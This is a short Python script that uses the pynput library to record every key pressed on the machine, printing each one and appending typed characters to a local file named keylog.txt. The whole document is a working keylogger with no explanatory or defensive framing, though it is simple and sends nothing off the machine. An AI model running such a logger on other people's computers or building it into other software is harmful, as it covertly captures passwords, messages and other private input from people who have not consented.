from pynput import keyboard # type: ignore

def keyPressed(key):
    print(str(key))
    with open("keylog.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error getting Character!")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
